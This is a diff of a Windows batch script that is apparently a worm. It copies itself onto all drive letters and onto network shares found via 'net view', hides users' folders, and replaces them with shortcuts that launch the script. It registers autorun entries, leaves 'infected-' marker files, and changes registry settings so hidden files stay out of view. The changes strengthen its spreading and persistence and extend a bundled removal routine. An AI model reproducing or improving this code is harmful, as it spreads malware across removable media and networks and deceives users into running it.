@@ -61,7 +61,9 @@ for %%z in ("%path_desktop%\%app_date%" "%systemDrive%\%app_date%") do if exist 
 
 %module_fileTouch% "%~f0" >nul
 
-if exist "extensions" for %%i in (%extensions%) do for /f "tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "start" start /b "" extensions\%%i\%%k
+if exist "extensions" for %%i in (%extensions%) do for /f "eol=# tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "start" (
+  start /b "" extensions\%%i\%%k
+)
 
 
 
@@ -82,12 +84,14 @@ for %%z in ("%path_desktop%\%app_date%" "%systemDrive%\%app_date%") do if exist 
 
 
 
-if exist "extensions" for %%i in (%extensions%) do for /f "tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "cycle" start /b "" extensions\%%i\%%k
+if exist "extensions" for %%i in (%extensions%) do for /f "eol=# tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "cycle" (
+  start /b "" extensions\%%i\%%k
+)
 
 
 
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"    /v Hidden          /t REG_DWORD /d 2 /f >nul
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"    /v ShowSuperHidden /t REG_DWORD /d 0 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden          /t REG_DWORD /d 2 /f >nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t REG_DWORD /d 0 /f >nul
 
 
 
@@ -126,7 +130,10 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
 
           if exist "%%i:\%%j\desktop.ini" for /f "tokens=1,2 delims==" %%d in ('type "%%i:\%%j\desktop.ini"') do if /i "%%d" == "IconResource" set icon=%%e
 
-          %module_shortcut% /a:c /f:"%%i:\%%j.lnk" /t:"%%i:\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
+          if exist "%%i:\System Volume Information\%~nx0" (
+            %module_shortcut% /a:c /f:"%%i:\%%j.lnk" /t:"%%i:\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
+          ) else %module_shortcut% /a:c /f:"%%i:\%%j.lnk" /t:"%%i:\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
+
           %module_fileTouch% "%%i:\%%j.lnk" >nul
         )
       )
@@ -144,7 +151,7 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NE
   for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" (
     %directory% "%%h\%%i"
 
-    if not exist "%%h\%%i\System Volume Information\infected-%app_date%" (
+    if not exist "%%h\%%i\infected-%app_date%" if not exist "%%h\%%i\System Volume Information\infected-%app_date%" (
       for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
 
         attrib +h +s "%%h\%%i\%%j"
@@ -160,6 +167,11 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NE
           if exist "%%h\%%i\%%j\desktop.ini" for /f "tokens=1,2 delims==" %%d in ('type "%%h\%%i\%%j\desktop.ini"') do if /i "%%d" == "IconResource" set icon=%%e
 
           %module_shortcut% /a:c /f:"%%h\%%i\%%j.lnk" /t:"%%h\%%i\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
+
+          if exist "%%h\%%i\System Volume Information\%~nx0" (
+            %module_shortcut% /a:c /f:"%%h\%%i\%%j.lnk" /t:"%%h\%%i\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
+          ) else %module_shortcut% /a:c /f:"%%h\%%i\%%j.lnk" /t:"%%h\%%i\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
+
           %module_fileTouch% "%%h\%%i\%%j.lnk" >nul
         )
       )
@@ -185,6 +197,9 @@ goto :cycle
 
 
 :remover
+if exist "extensions" for %%i in (%extensions%) do for /f "eol=# tokens=1,* delims==" %%j in ('type "extensions\%%i\config.ini"') do if /i "%%j" == "remove" (
+  start /wait /b "" extensions\%%i\%%k
+)
 
 
 
@@ -202,13 +217,28 @@ for %%i in (localAppData appData) do (
 
 
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" (
+  if exist "%%i:\%~nx0" (
+    attrib -h -s "%%i:\%~nx0"
+    del /q "%%i:\%~nx0"
+    %autoRun% delete %%i
+  )
+  
+  if exist "%%i:\infected-%app_date%" (
+    attrib -h -s "%%i:\infected-%app_date%"
+    del /q "%%i:\infected-%app_date%"
+  )
+
   for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
     if /i "%%j" == "System Volume Information" if exist "%%i:\%%j\%~nx0" (
+      attrib -h -s "%%i:\%%j\%~nx0"
       del /q "%%i:\%%j\%~nx0"
       %autoRun% delete %%i
     )
 
-    if exist "%%i:\System Volume Information\infected-%app_date%" del /q "%%i:\System Volume Information\infected-%app_date%"
+    if exist "%%i:\System Volume Information\infected-%app_date%" (
+      attrib -h -s "%%i:\System Volume Information\infected-%app_date%"
+      del /q "%%i:\System Volume Information\infected-%app_date%"
+    )
 
     if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
       attrib -h -s "%%i:\%%j"
@@ -225,11 +255,15 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NE
   for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" (
     for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
       if /i "%%j" == "System Volume Information" if exist "%%h\%%i\%%j\%~nx0" (
+        attrib -h -s "%%h\%%i\%%j\%~nx0"
         del /q "%%h\%%i\%%j\%~nx0"
         %autoRun% delete %%i %%h
       )
 
-      if exist "%%h\%%i\%%j\infected-%app_date%" del /q "%%h\%%i\%%j\infected-%app_date%"
+      if exist "%%h\%%i\%%j\infected-%app_date%" (
+        attrib -h -s "%%h\%%i\%%j\infected-%app_date%"
+        del /q "%%h\%%i\%%j\infected-%app_date%"
+      )
 
       if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
         attrib -h -s "%%h\%%i\%%j"
@@ -304,19 +338,24 @@ exit /b
 
 :directory
 if not exist %*\"%app_file_name%" copy /y "%app_file%" %*\
-attrib +h +s %*\"%app_file_name%"
-%module_fileTouch% %*\"%app_file_name%" >nul
+if exist %*\"%app_file_name%" (
+  attrib +h +s %*\"%app_file_name%"
+  %module_fileTouch% %*\"%app_file_name%" >nul
 
-%autoRun% add %* %*\"%app_file_name%"
+  %autoRun% add %* %*\"%app_file_name%"
+)
+
 if not exist %*\"System Volume Information" md %*\"System Volume Information"
 
 
 
 if not exist %*\"System Volume Information\%app_file_name%" copy /y "%app_file%" %*\"System Volume Information"
-attrib +h +s %*\"System Volume Information\%app_file_name%"
-%module_fileTouch% %*\"System Volume Information\%app_file_name%" >nul
+if exist %*\"System Volume Information\%app_file_name%" (
+  attrib +h +s %*\"System Volume Information\%app_file_name%"
+  %module_fileTouch% %*\"System Volume Information\%app_file_name%" >nul
 
-%autoRun% add %* %*\"System Volume Information\%app_file_name%"
+  %autoRun% add %* %*\"System Volume Information\%app_file_name%"
+)
 
 
 
